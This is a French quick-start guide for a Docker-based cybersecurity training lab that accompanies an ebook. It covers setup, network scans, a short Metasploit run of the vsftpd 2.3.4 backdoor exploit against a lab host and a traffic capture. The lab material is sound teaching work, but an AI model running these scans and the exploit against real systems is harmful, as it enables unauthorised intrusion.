# 🚀 Guide de Démarrage Rapide

---

## ⚡ Démarrage en 5 Minutes

### Prérequis
- Docker et Docker Compose installés
- 16 GB RAM minimum
- 50 GB d'espace disque libre

### Étapes

```bash
# 1. Cloner le dépôt
git clone https://github.com/votre-username/cybersecurity-lab-ebook-deliverables.git
cd cybersecurity-lab-ebook-deliverables

# 2. Lancer le lab
docker-compose up -d

# 3. Vérifier que tout fonctionne
docker-compose ps

# 4. Se connecter à Kali
docker exec -it kali-attacker bash

# 5. Tester
nmap -sV 192.168.100.20
```

**Félicitations ! Votre lab est opérationnel ! 🎉**

---

## 🎯 Premiers Tests Recommandés

### Test 1 : Scan Réseau (2 min)
```bash
# Dans Kali
nmap -sn 192.168.100.0/24
nmap -sV -p- 192.168.100.20
```

### Test 2 : Exploitation vsftpd (5 min)
```bash
# Dans Kali
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.100.20
exploit
```

### Test 3 : Capture Trafic (3 min)
```bash
# Dans Kali
tcpdump -i eth0 -w /opt/pcaps/first_capture.pcap host 192.168.100.20 &
curl http://192.168.100.20
killall tcpdump
wireshark /opt/pcaps/first_capture.pcap
```

---

## 📚 Prochaines Étapes

1. ✅ Consulter le README complet : `README.md`
2. ✅ Suivre la checklist de vérification : `checklists/verification_lab.md`
3. ✅ Commencer les exercices de l'ebook
4. ✅ Documenter vos tests avec `templates/rapport_lab_template.md`

---

## 🆘 Aide

**Problème ?** Consultez :
- `checklists/verification_lab.md` → Section Dépannage
- `README.md` → Section Support
- Issues GitHub

**Arrêter le lab :**
```bash
docker-compose down
```

**Redémarrer :**
```bash
docker-compose restart
```

---

## 🔗 Liens Utiles

| Ressource | Lien |
|-----------|------|
| Documentation complète | [README.md](README.md) |
| Résumé des livrables | [LIVRABLES_SUMMARY.md](LIVRABLES_SUMMARY.md) |
| Checklist progression | [checklists/progression_chapitres.md](checklists/progression_chapitres.md) |
| Mapping MITRE | [mitre-attack/mapping_mitre_attack.md](mitre-attack/mapping_mitre_attack.md) |
| Templates rapports | [templates/rapport_lab_template.md](templates/rapport_lab_template.md) |

---

**Bon apprentissage ! 🎓**
